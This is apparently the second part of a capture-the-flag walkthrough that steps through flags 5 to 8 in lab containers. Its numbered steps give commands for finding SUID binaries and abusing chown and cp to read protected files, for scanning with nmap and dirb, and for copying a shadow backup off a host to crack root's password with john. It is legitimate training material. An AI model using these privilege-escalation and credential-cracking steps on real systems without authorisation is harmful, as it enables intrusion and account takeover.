Part2

1.  ssh to ubuntu1, look for flag5
	ex:  ssh spike@localhost -p 3210
2.  flag5 is in /home/root but the directory cannot be listed due to permissions
3.  search for some way to bypass this -- in this case, look for something useful with the suid bit set
	ex: find / -perm /4000
4.  chown seems to have the suid bit and will do what we need
	ex: chown test /home/root
5.  viewing flag5 tells us 172.16.88.87 is listening on 4321.  use nc to connect to ubuntu2, receive ssh creds
	ex: nc 172.16.88.87 4321
	***note: this only works once!  the port will refuse additional connections until the container is restarted
6.  ssh to ubuntu2 and look for flag6.  It is hidden file in /tmp
	ex: ls -R / 2>/dev/null | grep *flag
	    ls -R / 2>/dev/null | grep .*
7.  flag6 has credentials and mentions another box - nmap the subnet
	ex: nmap 172.16.88.0/24
8.  ssh to 172.16.88.99 and look for flag7.  Hint points towards finding a useful script (located in /usr/bin)
	ex: ls /usr/bin
9. Unfortunately, you can't read or execute the script to generate the last flag (flag_write.sh) but maybe
	there is some way to read the script.  Look for useful binaries here
	ex: find / -perm /4000   
10. cp seems to have the suid bit set and can be used to read the script which reveals the contents of flag7!
	ex: LFILE=/usr/bin/flag_write.sh
	    cp "$LFILE" /dev/stdout
11. flag7 says a webserver is accessible through your localhost on port 9331.  when you navigate to the page
	it mentions dirb--maybe something interesting is discoverable using dirb?
	ex: dirb http://localhost:9331
12. dirb showed there was a file called "pass" that may be accessible.  try it and see what you get!
	ex: http://localhost:9331/pass
13. the result is some ssh credentials and a tip that ssh is exposed through localhost 9339.
	ex: ssh ein@localhost -p 9339
14. the web server has a hint in ein's home directory telling you that you need root to find the flag.
	poking around the file system will yield the hidden file /tmp/.shadow.bak
	ex: ls -al /tmp
15. looks like it is time to try to crack root's password.  conveniently, the kali1 machine has john installed
	(and a modified password.lst file as well).  transfer the file over to the kali1 box and have a go at it
	ex: scp /tmp/.shadow.bak faye@172.16.88.99:/home/faye/shadow
	    john shadow
16. with the root password cracked, time to switch to root and poke around the file system some more.
	flag8 is located in /home/root

Congrats! See you Space Cowboy...
